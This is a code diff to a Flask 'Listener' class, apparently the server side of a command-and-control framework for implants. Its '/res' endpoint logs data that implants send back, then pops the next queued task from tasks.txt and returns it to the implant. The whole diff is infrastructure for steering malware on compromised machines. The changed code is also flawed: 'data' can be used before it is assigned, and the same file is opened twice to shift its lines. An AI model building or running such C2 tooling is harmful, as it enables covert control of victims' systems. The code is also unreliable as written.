@@ -74,12 +74,26 @@ class Listener:
         # 回传结果
         @self.app.route("/res", methods=['POST'])
         def getResults():
-            if str(flask.request.get_json()) != '{}':
-                body = flask.request.get_json()
-                print("Received implant response: {}".format(body))
-                return 'ok', 200
-            else:
-                return 'failed', 400
+            body = flask.request.get_json()
+            print("Received implant response: {}".format(body))
+            # if str(flask.request.get_json()) != '{}':
+            #     body = flask.request.get_json()
+            #     print("Received implant response: {}".format(body))
+            #     return "OK", 200
+            # else:
+            if os.path.exists(self.agentsPath):
+                with open(self.agentsPath + "tasks.txt", "r") as f:
+                    with open(self.agentsPath + "tasks.txt", "r+") as new_file:
+                        data = f.readline()
+                        # 被删除行的下一行读给 next_line
+                        next_line = f.readline()
+                        # 连续覆盖剩余行，后面所有行上移一行
+                        while next_line:
+                            new_file.write(next_line)
+                            next_line = f.readline()
+                            # 写完最后一行后截断文件，因为删除操作，文件整体少了一行，原文件最后一行需要去掉
+                        new_file.truncate()
+            return data, 200
 
     # flask applications don’t provide a reliable way to stop the application
     # only way was to kill the process
